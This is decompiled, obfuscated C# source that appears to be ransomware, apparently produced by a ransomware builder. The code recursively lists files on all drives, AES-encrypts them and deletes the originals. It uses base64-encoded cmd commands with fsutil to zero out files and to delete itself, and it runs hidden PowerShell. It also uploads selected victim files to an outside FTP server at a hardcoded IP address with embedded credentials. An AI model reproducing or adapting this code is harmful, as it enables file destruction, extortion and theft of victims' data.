		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(qlgUvNJCRuJkG("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), qlgUvNJCRuJkG("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int cuWpSiPIPWd(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> dcLwQMGILOZuQC(string string_0)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00e6;
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00e6:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().EndsWith(".crypted"))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ROMJPWDokvOAc) * 1024.0 * 1024.0 && KVXxStcGhLt == "YES")
						{
							list.Add(fileInfo.FullName);
						}
						else if (File.Exists(fileInfo.FullName) && KVXxStcGhLt == "NO")
						{
							list.Add(fileInfo.FullName);
						}
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string xUeVsqPFysm(string wQtsRaPqfJ = "", string rlGVgWqzsG = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = wQtsRaPqfJ,
				Arguments = rlGVgWqzsG,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		catch
		{
		}
		return result;
	}

	public static void bmryBPshhEFFyoM(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string qlgUvNJCRuJkG(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void nCGKAuYuTCR()
	{
		xUeVsqPFysm("cmd.exe", qlgUvNJCRuJkG("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = qlgUvNJCRuJkG("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void xXNoCxZJmR(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		IXeelhjfnkbbI xeelhjfnkbbI = new IXeelhjfnkbbI();
		xeelhjfnkbbI.btEpHKLIBDCkaFP = string_1;
		xeelhjfnkbbI.aHCzRdAomyQf = string_2;
		xeelhjfnkbbI.VrfRRwtyTgpz = string_3;
		xeelhjfnkbbI.gTlZNytZFDcqoAEhw = string_4;
		DbMghamfwARw = Encoding.ASCII.GetBytes(xeelhjfnkbbI.VrfRRwtyTgpz);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !tpUqhpGZfg.Contains(drives[i].Name))
					{
						tpUqhpGZfg.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!tpUqhpGZfg.Contains(string_0[i]))
				{
					tpUqhpGZfg.Add(string_0[i]);
				}
			}
		}
		using List<string>.Enumerator enumerator = tpUqhpGZfg.GetEnumerator();
		while (enumerator.MoveNext())
		{
			TWuVUTtEqAEB CS_0024_003C_003E8__locals0 = new TWuVUTtEqAEB();
			CS_0024_003C_003E8__locals0.FZjnGhZqQCLYbX = xeelhjfnkbbI;
			CS_0024_003C_003E8__locals0.OfhPCNgNxTvj = enumerator.Current;
			if (QAFZFuftjcGOKwIR == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					JGyJbgcyeoQw(CS_0024_003C_003E8__locals0.OfhPCNgNxTvj, CS_0024_003C_003E8__locals0.FZjnGhZqQCLYbX.btEpHKLIBDCkaFP, CS_0024_003C_003E8__locals0.FZjnGhZqQCLYbX.gTlZNytZFDcqoAEhw, CS_0024_003C_003E8__locals0.FZjnGhZqQCLYbX.aHCzRdAomyQf, CS_0024_003C_003E8__locals0.FZjnGhZqQCLYbX.VrfRRwtyTgpz);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				JGyJbgcyeoQw(CS_0024_003C_003E8__locals0.OfhPCNgNxTvj, xeelhjfnkbbI.btEpHKLIBDCkaFP, xeelhjfnkbbI.gTlZNytZFDcqoAEhw, xeelhjfnkbbI.aHCzRdAomyQf, xeelhjfnkbbI.VrfRRwtyTgpz);
			}
		}
	}

	public static void JGyJbgcyeoQw(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		list = ((!(zREzEUyyiAezB == "YES")) ? vtRtCUFVhoPX.SearchFiles(string_0) : dcLwQMGILOZuQC(string_0));
		foreach (string value in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					foreach (string value2 in string_3)
					{
						if (UsDrRmWVOsTrf == "YES")
						{
							if (!item.ToLower().EndsWith(value2))
							{
								continue;
							}
						}
						else if (!item.EndsWith(value2))
						{
							continue;
						}
						goto IL_0827;
					}
				}
				if (UsDrRmWVOsTrf == "YES")
				{
					if (lQKsWMYRkRw == "YES")
					{
						if (item.ToLower().EndsWith("exe") || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_RECOVER_MY_FILES") || item.ToLower().EndsWith(".crypted"))
						{
							continue;
						}
					}
					else if (!item.ToLower().EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_RECOVER_MY_FILES") || item.ToLower().EndsWith(".crypted"))
					{
						continue;
					}
				}
				else if (lQKsWMYRkRw == "YES")
				{
					if (item.ToLower().EndsWith("exe") || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_RECOVER_MY_FILES") || item.ToLower().EndsWith(".crypted"))
					{
						continue;
					}
				}
				else if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_RECOVER_MY_FILES") || item.ToLower().EndsWith(".crypted"))
				{
					continue;
				}
				if (zwciFfYZrmaq.Contains(item))
				{
					continue;
				}
				if (ymCDCajmIS == "YES")
				{
					try
					{
						if (OpmdbOytGaRur.PlNiJxtHSXuD(item))
						{
							OpmdbOytGaRur.EWbGlNDLTRBYGTQ(item);
						}
					}
					catch
					{
					}
				}
				zwciFfYZrmaq.Add(item);
				if (!UzylaUYbbu.Contains(Path.GetDirectoryName(item)))
				{
					UzylaUYbbu.Add(Path.GetDirectoryName(item));
				}
				try
				{
					if (string_2 != ".*")
					{
						SmLIqFCxzKRuGzs(item, item + string_2, DbMghamfwARw);
					}
					else
					{
						SmLIqFCxzKRuGzs(item, item + ".part", DbMghamfwARw);
					}
				}
				catch (Exception)
				{
				}
				IL_0827:;
			}
		}
	}

	private static void SmLIqFCxzKRuGzs(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (lIzEKIwoiIVuN == "YES")
					{
						foreach (string item in DnBSwKcULbdx)
						{
							if (string_0.ToLower().EndsWith(item) && FnyYzxGMgFqyf == "YES")
							{
								if (Convert.ToInt32(QesrnChlqX) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ebEAligDPpkfEi.BViiotGReAp("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && FnyYzxGMgFqyf == "NO")
							{
								try
								{
									ebEAligDPpkfEi.BViiotGReAp("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", string_0);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
